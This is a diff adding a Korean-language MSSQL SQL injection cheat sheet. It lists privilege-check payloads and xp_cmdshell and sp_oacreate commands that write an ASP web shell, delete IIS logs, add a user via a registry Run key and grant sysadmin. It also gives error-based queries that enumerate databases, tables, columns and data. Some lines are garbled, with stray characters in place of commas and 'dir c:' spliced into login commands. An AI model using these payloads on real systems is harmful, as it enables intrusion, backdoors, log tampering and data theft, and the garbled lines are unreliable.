@@ -1,0 +1,132 @@
+SQL Injection 기법 정리(MSSQL)
+#########################################
+
+# SQL Injection에 의해 자주 생성되는 테이블 명
+
+#########################################
+
+D99_CMD, D99_REG, D99_Tmp, DIY_TEMPCOMMAND_TABLE, t_jiaozhu, Siwebtmp,
+NB_Commander_Tmp, comd_list, Reg_Arrt,  jiaozhu, Reg_Arrt, xiaopan, DIY_TEMPTABLE,
+heige, kill_kk, SC_LOG, SC_TRAN
+
+ 
+
+ 
+
+#########################################
+
+# CHECK
+
+#########################################
+
+and 1=(select @@version) //version
+
+ 
+
+and 1=(IS_SRVROLEMEMBER('sysadmin')) // 전체 권한(sysadmin，dbcreator，diskadmin，processadmin，serveradmin，setupadmin，securityadmin)
+
+ 
+
+and 1=(IS_MEMBER('db_owner')) // 해당 DB 권한
+
+ 
+
+;declare @a int;--  // 사용여부
+
+and 0<>db_name() // DB명
+
+and user>0 // USER명
+
+ 
+
+ 
+
+#########################################
+
+# 중국 해커들이 애용하는 공격패턴
+
+#########################################
+
+;exec master.dbo.xp_cmdshell 'echo ^<script language=VBScript runat=server^>execute request^("l"^)^</script^> >c:\mu.asp';-- // File
+
+;exec master.dbo.xp_cmdshell 'del C:\winnt\system32\logfiles\W3SVC5\ex050718.log >c:\temp.txt' // LOG
+
+ 
+
+;exec master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\CurrentVersion\Run','help1','REG_SZ','cmd.exe /c net user test ptlove /add' // Registry
+
+ 
+
+DROP TABLE kill_kk;CREATE TABLE kill_kk(subdirectory VARCHAR(100)윕
+depth VARCHAR(100)윕[file] VARCHAR(100)) Insert kill_kk
+exec master..xp_dirtree "D:/"윕 1윕1-- // Table 생성
+
+ 
+
+DECLARE @shell INT DECLARE @fso INT DECLARE @file INT DECLARE @isEnd BIT DECLARE @out VARCHAR(400) EXEC sp_oacreate 'wscript.shell',@shell output EXEC sp_oamethod @shell,'run',null,'cmd.exe /c cscript C:\Inetpub\AdminScripts\adsutil.vbs set /W3SVC/InProcessIsapiApps "C:\WINNT\system32\idq.dll" "C:\WINNT\system32\inetsrv\httpext.dll" "C:\WINNT\system32\inetsrv\httpodbc.dll" "C:\WINNT\system32\inetsrv\ssinc.dll" "C:\WINNT\system32\msw3prt.dll" "C:\winnt\system32\inetsrv\asp.dll">c:\temp.txt','0','true' EXEC sp_oacreate 'scripting.filesystemobject',@fso output EXEC sp_oamethod @fso,'opentextfile',@file out,'c:\temp.txt' WHILE @shell>0 BEGIN EXEC sp_oamethod @file,'Readline',@out out INSERT INTO MYTMP(info) VALUES (@out) EXEC sp_oagetproperty @file,'AtEndOfStream',@isEnd out IF @isEnd=1 BREAK ELSE CONTINUE END
+
+ 
+
+ 
+
+#########################################
+
+# 공격 시나리오
+
+#########################################
+
+;DROP TABLE [X_5450];use master dbcc addextendedproc('xp_cmdshell','xplog70.dll')--
+
+
+ And (Select Top 1 CASE WHEN ResultTxt is Null then char(124) else ResultTxt+char(124) End from (Select Top 1 id,ResultTxt from [X_5450] order by [id]) T order by [id] desc)>0
+
+
+;use master dbcc addextendedproc('xp_cmdshell','xplog70.dll')--
+ 
+;CREATE TABLE [X_5450]([id] int NOT NULL IDENTITY (1,1), [ResultTxt] nvarchar(4000) NULL);insert into [X_5450](ResultTxt) exec master.dbo.xp_cmdshell 'dir c:';insert into [X_5450] values ('g_over');exec master.dbo.sp_dropextendedproc 'xp_cmdshell'--
+ 
+;use master declare @o int exec sp_oacreate 'wscript.shell',@o out exec sp_oamethod @o,'run',NULL,'OSQL -E -S localhost -d master -Q "exec sp_addsrvrolemember dir c:,sysadmin"'--
+ 
+;use master declare @o int exec sp_oacreate 'wscript.shell',@o out exec sp_oamethod @o,'run',NULL,'OSQL -E -S localhost -d master -Q "exec sp_addlogin dir c:,xiaoxue"'--
+ 
+;DROP TABLE [X_5450];use master dbcc addextendedproc('xp_cmdshell','xplog70.dll')--
+
+ 
+
+ 
+
+#########################################
+
+# 기타 쿼리문
+
+#########################################
+
+모든 db명 쿼리하기
+and 1=(select name from master.dbo.sysdatabases where dbid=7)
+and 1=(select name from master.dbo.sysdatabases where dbid=8)
+
+ 
+
+특정db에서 사용자가 만든 테이블명 불러오기
+and 0<>(select top 1 name from snortids.dbo.sysobjects where xtype=char(85))
+and 0<>(select top 1 name from (select top 행증가 name from .dbo.sysobjects where xtype='U' order by name asc) as table1 order by name desc)
+
+ 
+
+테이블의 컬럼정보 불러오기
+
+특정 테이블고유ID 가져오기(char(97)+char(98)+char(99)=abc) 1061578820
+and 0<>(select count(*) from snortids.dbo.sysobjects where xtype='U' and name=char(97)+char(99)+char(105)+char(100)+char(95)+char(101)+char(118)+char(101)+char(110)+char(116) and uid>(str(id)))
+
+ 
+
+컬럼명 가져오기
+and 0<>(select top 1 name from snortids.dbo.syscolumns where id=1061578820)
+and 0<>(select top 1 name from (select top 행증가 name from snortids.dbo.syscolumns where id=1061578820 order by name asc) as table1 order by name desc)
+
+ 
+
+데이터 가져오기
+and 0<>(select top 1 char(94)+Cast(sig_name as varchar(8000))+char(94) from SnortIDS..acid_event)
+and 0<>(select top 1 char(94)+Cast(컬럼명 as varchar(8000))+char(94) from SnortIDS..acid_event where 컬럼명 not in('이미얻은내용'))
+and 0<>(select top 1 char(94)+Cast(컬럼명 as varchar(8000))+char(94) from (select top 행수 컬럼명 from SnortIDS.dbo.acid_event order by 컬럼명 asc) as table1 order by 컬럼명 desc)
